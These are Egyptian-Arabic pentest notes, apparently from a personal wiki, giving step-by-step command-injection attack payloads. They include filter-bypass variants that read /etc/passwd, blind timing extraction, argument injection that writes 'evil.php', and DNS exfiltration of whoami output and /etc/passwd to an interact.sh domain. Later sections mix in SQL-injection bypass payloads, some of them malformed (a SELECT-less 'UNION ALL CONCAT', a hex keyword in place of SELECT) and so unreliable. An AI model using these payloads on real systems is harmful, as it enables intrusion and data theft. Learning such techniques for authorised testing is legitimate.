
## 1.  [[فهم Command Injection إيه هو وازاي بيشتغل]]

## 2.   [[أين تبحث عن ثغرة Command Injection]] ؟

## 3. [[امتي اعرف ان في ثغره ال  Command Injection]]  


# 4.  إزاي تستغلها؟

##  الخطوة  1: اختبار الأوامر الأساسية (Basic Commands)
#### - [[شرح الخطوه Basic Commands]]
#### - [[سيناريوهات اللي هستخدمها في الخطوه Basic Commands]]
---

## الخطوة  2:اختبار ربط الأوامر (Chaining Commands)
#### - [[شرح الخطوه Chaining Commands]]
#### - [[سيناريوهات اللي هستخدمها في الخطوه Chaining Commands]]
---
## الخطوة  3: Argument Injection
#### -[[شرح الخطوه Argument Injection]]
#### -[[سيناريوهات اللي هستخدمها في الخطوه Argument Injection]]
----
## الخطوة  4 : Inside a Command
#### -[[شرح الخطوه Inside a Command]]
#### - [[سيناريوهات اللي هستخدمها في الخطوه Inside a Command]]
----
## الخطوة  5 : Filter Bypasses
#### -[[شرح الخطوه Filter Bypasses]]
#### - [[سيناريوهات اللي هستخدمها في الخطوه Filter Bypasses]]
----
## الخطوة  6  Data Exfiltration
#### -[[شرح الخطوه Data Exfiltration]]
#### -[[سيناريوهات اللي هستخدمها في الخطوه Data Exfiltration]]
---
## الخطوة  7 : Polyglot Command Injection
#### -[[شرح الخطوه Polyglot Command Injection]]
#### - [[سيناريوهات اللي هستخدمها في الخطوه Polyglot Command Injection]]
---
## الخطوة  8  : Tricks
#### -[[شرح الخطوه Tricks]]
#### - [[سيناريوهات اللي هستخدمها في الخطوه Tricks]]
---
## الخطوة  9 : Encoding
#### -[[شرح الخطوه Encoding]]
#### -[[سيناريوهات اللي هستخدمها في الخطوه Encoding]]
---
## الخطوة  10 : Case Variation
#### -[[شرح الخطوه Case Variation]]
#### - [[سيناريوهات اللي هستخدمها في الخطوه Case Variation]]
---
## الخطوة  11 : استخدام تعليقات أو مسافات بديلة
#### -[[شرح الخطوه استخدام تعليقات أو مسافات بديلة]]
#### - [[سيناريوهات اللي هستخدمها في الخطوه استخدام تعليقات أو مسافات بديلة]]
---
## الخطوة  12 : استخدام كلمات بديلة أو دوال
#### -[[شرح الخطوه استخدام كلمات بديلة أو دوال]]
#### -[[سيناريوهات اللي هستخدمها في الخطوه استخدام كلمات بديلة أو دوال]]
---
## الخطوة  13 : String Concatenation
#### -[[شرح الخطوه String Concatenation]]
#### -[[سيناريوهات اللي هستخدمها في الخطوه String Concatenation]]
---

## الخطوة  14 : Obfuscation Techniques

#### - [[شرح الخطوه Obfuscation Techniques]]
#### - [[سيناريوهات اللي هستخدمها في الخطوه Obfuscation Techniques]]

---
## الخطوة  15 : Full Shell Access
#### - [[شرح الخطوه Full Shell Access]]
#### - [[سيناريوهات اللي هستخدمها في الخطوه Full Shell Access]]

---
## الخطوة  16 : Web Shells
#### - [[شرح الخطوه Web Shells]]
#### - [[سيناريوهات اللي هستخدمها في الخطوه Web Shells]]

----


## **4. اختبار حقن الوسائط (Argument Injection)**
- **إيه اللي هتعمله؟** لو ما قدرتش تحقن أمر كامل، جرب تضيف وسائط خطيرة لأمر موجود.
- **إزاي تعملها؟**
  - لو الموقع بيستخدم أمر زي `wget` أو `curl`، جرب تضيف وسيطة زي `--output`. مثال:
    - `example.com/download?url=http://example.com --output evil.php`.
  - جرب وسائط زي `--help` أو `--version` عشان تشوف لو الموقع بيظهر ناتج غريب.
  - لو الموقع نفذ الوسيطة (مثل إنشاء ملف)، يبقى فيه ثغرة.
- **مثال**: جرب: `example.com/download?url=http://example.com -o /tmp/test.txt`.
## - **ملخص الأوامر**:
  - `--output evil.php` (يحفظ ملف باسم `evil.php` مع `wget` أو `curl`).
  - `-o /tmp/test.txt` (يحفظ ملف في `/tmp` مع `curl`).
  - `--help` (يظهر تعليمات الأمر).
  - `--version` (يظهر إصدار الأمر).

---

## **5. اختبار الأوامر داخل أوامر (Inside a Command)**
- **إيه اللي هتعمله؟** جرب تحقن أمر جوا أمر تاني باستخدام `$(...)` أو `` `...` ``.
- **إزاي تعملها؟**
  - حط أمر جوا تعبير. مثال:
    - `8.8.8.8;ping $(whoami)` (يحاول يختبر الاتصال بناتج `whoami`).
    - `8.8.8.8;echo `whoami`` (نفس الفكرة).
  - لو الموقع نفذ الأمر الداخلي، يبقى فيه ثغرة.
- **مثال**: جرب: `example.com/ping?ip=8.8.8.8;ping $(whoami)`.
## - **ملخص الأوامر**:
  - `ping $(whoami)` (يختبر الاتصال بناتج `whoami`).
  - `echo `whoami` (يظهر ناتج `whoami`).
  - `$(id)` (ينفذ `id` داخل أمر).
  - `` `ls` `` (ينفذ `ls` داخل أمر).

---

## **6. اختبار تجاوز الفلاتر (Filter Bypasses)**
- **إيه اللي هتعمله؟** لو الموقع بيمنع رموز زي `;` أو المسافات، جرب حيل عشان تتخطى الفلاتر.
- **إزاي تعملها؟**
  - جرب الحيل دي:
    - **بدون مسافة**:
      -  `$IFS` بدل المسافة: `8.8.8.8;cat$IFS/etc/passwd`.
      - أقواس `{}`: `8.8.8.8;{cat,/etc/passwd}`.
      - `<`: `8.8.8.8;cat</etc/passwd`.
    - **بسطر جديد**:
      - استخدم `%0A`: `8.8.8.8%0Als`.
    - **بخط مائل وسطر جديد**:
      - `8.8.8.8;cat$IFS/et%5C%0Ac/pa%5C%0Asswd` (`%5C` = `\`, `%0A` = سطر جديد).
    - **بترميز سداسي**:
      - `/etc/passwd` = `\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64`. جرب: `8.8.8.8;cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"``$.
    - **باقتباسات**:
      - مفردة: `8.8.8.8;w'h'oami`.
      - مزدوجة: `8.8.8.8;w"h"oami`.
      - عكسية: `8.8.8.8;wh``oami`.
    - **بخط مائل أو شرطة**:
      - `8.8.8.8;w\ho\am\i`.
      - `8.8.8.8;/\b\i\n/////s\h`.
    - **بـ `$@` أو `$()`**:
      - `8.8.8.8;who$@ami`.
      - `8.8.8.8;who$(echo am)i`.
    - **برموز شاملة**:
      - `8.8.8.8;cat$IFS/?t?/p??s?d`.
  - لو أي حيلة نجحت، يبقى الفلاتر ضعيفة.
- **مثال**: جرب: `example.com/ping?ip=8.8.8.8;cat$IFS/etc/passwd`.
## - **ملخص الأوامر**:
  - `cat$IFS/etc/passwd` (يستخدم `$IFS` بدل المسافة).
  - `{cat,/etc/passwd}` (يستخدم أقواس لتجنب المسافة).
  - `cat</etc/passwd` (يستخدم إدخال ملف).
  - `cat$IFS/et%5C%0Ac/pa%5C%0Asswd` (يستخدم خط مائل وسطر جديد).
  - `cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`` (يستخدم ترميز سداسي).
  - `w'h'oami` (اقتباسات مفردة).
  - `w"h"oami` (اقتباسات مزدوجة).
  - `wh``oami` (اقتباسات عكسية).
  - `w\ho\am\i` (خط مائل).
  - `/\b\i\n/////s\h` (شرطة وخط مائل).
  - `who$@ami` (يستخدم `$@`).
  - `who$(echo am)i` (يستخدم `$()`).
  - `cat$IFS/?t?/p??s?d` (رموز شاملة).

---

## **7. اختبار سرقة البيانات (Data Exfiltration)**
- **إيه اللي هتعمله؟** لو ما قدرتش تشوف ناتج الأوامر مباشرة، جرب تسرق البيانات بطرق غير مباشرة.
- **إزاي تعملها؟**
  - **بالتوقيت**:
    - جرب أمر يعتمد على التأخيرj `8.8.8.8;if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi`.
    - لو الصفحة استغرقت 5 ثواني، يبقى الحرف الأول “s”. كرر لكل حرف.
  - **بـ DNS**:
    - استخدم أداة زي `app.interactsh.com` وخد نطاق (مثل `xxxx.interact.sh`).
    - جرب: `8.8.8.8;host $(whoami).xxxx.interact.sh`.
    - لو شفت الناتج في الأداة، يبقى نجحت.
- **مثال**: جرب: `example.com/ping?ip=8.8.8.8;if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi`.
## - **ملخص الأوامر**:
  - `if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi` (تأخير 5 ثواني لو الحرف الأول “s”).
  - `if [ $(whoami|cut -c 2) == w ]; then sleep 5; fi` (نفس الفكرة للحرف التاني).
  - `host $(whoami).xxxx.interact.sh` (يرسل ناتج `whoami` عبر DNS).
  - `host $(cat /etc/passwd).xxxx.interact.sh` (يرسل ملف عبر DNS).

---

## **8. اختبار حقن متعدد البيئات (Polyglot Command Injection)**
- **إيه اللي هتعمله؟** جرب أمر يشتغل في أي سياق (عادي، داخل اقتباسات مفردة أو مزدوجة).
- **إزاي تعملها؟**
  - استخدم أمر بوليجلوت زي: `8.8.8.8;1;sleep${IFS}9;#`.
  - جرب في سياقات مختلفة:
    - `8.8.8.8;echo '1;sleep${IFS}9;#'`.
    - `8.8.8.8;echo "1;sleep${IFS}9;#"`.
  - لو الصفحة تأخرت 9 ثواني، يبقى الأمر نفذ.
- **مثال**: جرب: `example.com/ping?ip=8.8-ka8.8;1;sleep${IFS}9;#`.
## - **ملخص الأوامر**:
  - `1;sleep${IFS}9;#` (بوليجلوت يعمل في سياقات متعددة).
  - `echo '1;sleep${IFS}9;#'` (داخل اقتباسات مفردة).
  - `echo "1;sleep${IFS}9;#"` (داخل اقتباسات مزدوجة).

---

## **9. استخدام الحيل الإضافية (Tricks)**
- **إيه اللي هتعمله؟** لو الأوامر بتتوقف بسبب قيود زي الوقت، جرب حيل إضافية.
- **إزاي تعملها؟**
  - **تشغيل في الخلفية**:
    - جرب:  `8.8.8.8;nohup sleep 120 &`.
    - لو الأمر نفذ من غير توقف، يبقى نجح.
  - **إزالة الوسائط الزيادة**:
    - جرب:  j   `8.8.8.8;ls -- extra`.
    - لو `ls` نفذ و`extra` اتجاهل، يبقى نجح.
- **مثال**: جرب: `example.com/ping?ip=8.8.8.8;nohup whoami &`.
## - **ملخص الأوامر**:
  - `nohup sleep 120 &` (يشغل الأمر في الخلفية).
  - `nohup whoami &` (يشغل `whoami` في الخلفية).
  - `ls -- extra` (يتجاهل `extra` بعد الأمر).
  - `cat /etc/passwd -- extra` (يتجاهل `extra` بعد قراءة الملف).

---
## **10. استخدام التشفير (Encoding)**
#### **إيه هو؟**
لو الفلتر بيمنع حروف زي `'` أو `;`، تقدر تشفر الكود بطرق زي URL Encoding أو Base64 عشان يعدي الفلتر ويتفسر بعدين.

#### **ازاي بيشتغل؟**
بتحول الأوامر لصيغة مشفرة، والسيرفر لما يفكها بينفذها عادي لو الفلتر مش بيفحص بعد الفك.

#### **مثال عملي:**
- لو الفلتر بيمنع `;whoami`:
  استخدم URL Encoding:
  ```
  127.0.0.1%3Bwhoami
  ```
  (%3B هو `;` مشفر). لو نجح:
  ```
  http://example.com/ping.php?ip=127.0.0.1%3Bwhoami
  ```

- لو بيمنع كلمة `SELECT`:
  استخدم Hex:
  ```
  0x53454c454354 (يعني SELECT)

  ```
  
  ```
  ' UNION 0x53454c454354 1, username FROM users --
  ```

## - **ملخص الأوامر**:
	  - استخدم URL Encoding:   
ابقي شيل العلامه دي ==;== وحط مكانها  ==%3B==  
 ```
  http://example.com/ping.php?ip=127.0.0.1%3Bwhoami
  ```

   - لو بيمنع كلمة `SELECT`  
  ابقي شيل ==SELECT== وحط مكانها ==0x53454c454354==
   ```
  ' UNION 0x53454c454354 1, username FROM users --
  ```
---
## **11. تغيير حالة الحروف (Case Variation)**
#### **إيه هو؟**
بعض الفلاتر بتبحث عن كلمات بصيغة معينة (زي `select` صغير)، فتقدر تستخدم حروف كبيرة أو مختلطة عشان تتخطاها.

#### **ازاي بيشتغل؟**
بتكتب الأوامر بحروف كبيرة أو صغيرة بطريقة مختلفة عن اللي الفلتر متوقعها.

#### **مثال عملي:**
- لو الفلتر بيمنع `select`:
  جرب:
  ```
  ' UNION SeLeCt 1, username FROM users --
  ```
  لو نجح، يبقى الفلتر حساس للحالة.

- لو بيمنع `system` في PHP:
  ```
  SyStEm($_GET['cmd'])
  ```

#### **خلاصة طريفة:**
تخيل إنك بتقول لصاحبك "افتح الباب" بصوت عالي ومنخفض، لو فتحلك لما تقول "AfTaH"، يبقى هو بيسمعك بطريقته!

## - **ملخص الأوامر**: ==(الخلاصه انك بتغير حروف في الكلمه بتخلي حبه capital وحبه small)==
- لو بيمنع كلمة `SELECT`  
  ابقي شيل ==SELECT== وحط مكانها  ==SeLeCt==
     ```
  ' UNION SeLeCt 1, username FROM users --
  ```
---
## **12. استخدام تعليقات أو مسافات بديلة**
#### **إيه هو؟**
لو الفلتر بيمنع مسافات أو كلمات متتالية، تقدر تستبدل المسافات بحاجات زي تعليقات (`/**/`) أو تباعد مختلف.

#### **ازاي بيشتغل؟**
بتفصل الكود بطرق الفلتر مش بيفهمها، لكن السيرفر بيقدر يفسره.

#### **مثال عملي:**
- لو الفلتر بيمنع `UNION SELECT`:
  جرب:
  ```
  ' UNION/**/SELECT 1, username FROM users --
  ```
- لو بيمنع مسافات:
  ```
  'UNION{newline}SELECT{newline}1,username{newline}FROM{newline}users--
  ```
  (حط Enter بدل {newline}).

#### **خلاصة طريفة:**
تخيل إنك بتقول للبواب "افتح — الباب" وتسكت ثانية بين الكلمتين، لو فتحلك يبقى هو بيفهمك حتى لو بطيء!


## - **ملخص الأوامر**: 
لو بيمنع المسافات ممكن تستخدم دول مكان المسافات  ==/**/==   او  =={Enter}==
  ```
  ' UNION/**/SELECT 1, username FROM users --
  ```
  ```
  'UNION{newline}SELECT{newline}1,username{newline}FROM{newline}users--
```

---
## 13. استخدام كلمات بديلة أو دوال**
#### **إيه هو؟**
لو الفلتر بيمنع كلمة معينة (زي `SELECT`)، تقدر تستخدم دوال أو تعبيرات بديلة تعمل نفس الشغل.

#### **ازاي بيشتغل؟**
بتستبدل الأمر بحاجة السيرفر بيفهمها بنفس المعنى، لكن الفلتر مش بيكتشفها.

#### **مثال عملي:**
- لو `SELECT` ممنوع:
  جرب:
  ```
  ' UNION ALL CONCAT(username) FROM users --
  ```
- لو `system` ممنوع:
  ```
  passthru($_GET['cmd'])
  ```

#### **خلاصة طريفة:**
تخيل إنك بتقول لصاحبك "مش هقولك افتح الباب، لكن زق الباب بإيدك"، لو زقه وفتح يبقى كده عديت الحراسة!

## - **ملخص الأوامر**: 

- لو `SELECT` ممنوع: استخدم كلمه بنفس المعني  السيرفر  بيفهما زي ALL CONCAT
```
  ' UNION ALL CONCAT(username) FROM users --
  ```
---
## **14. تقسيم الأوامر (String Concatenation)**
#### **إيه هو؟**
لو الفلتر بيمنع كلمة كاملة، تقدر تقسمها لأجزاء وتجمعهم في الاستعلام.

#### **ازاي بيشتغل؟**
بتستخدم دالة زي `CONCAT` أو `+` عشان تبني الأمر من جديد بعد الفلتر.

#### **مثال عملي:**
- لو `SELECT` ممنوع:
  ```
  ' UNION 'SEL' + 'ECT' 1, username FROM users --
  ```
- لو `whoami` ممنوع:
  ```
  http://example.com/ping.php?ip=127.0.0.1;w'hoa'mi
  ```

#### **خلاصة طريفة:**
تخيل إنك بتقول لصاحبك "افتح الباب"، لكن تقول "اف" و"تح" منفصلين، لو فهمك وفتح يبقى هو اللي ساعدك تتسحب!
## - **ملخص الأوامر**: 
- لو `SELECT` ممنوع: استخدم 'SEL' + 'ECT'  او ('SEL' + 'ECT') CONCAT
```
  ' UNION 'SEL' + 'ECT' 1, username FROM users --
  ```
لو `whoami` ممنوع:
  ```
  http://example.com/ping.php?ip=127.0.0.1;w'hoa'mi
  ```
---
## 15.[[Shell command injection techniques#**2. حقن الأوامر باستخدام التشفير أو التضليل (Obfuscation Techniques)**]]


## Tools in SQl injection


## [[script for command injection]]

## [[التأثير المحتمل للثغرة؟]]

## [[أمثلة عملية علي ال command injection]]

## [[اي اللي هعمله بعد ثغره command injection]]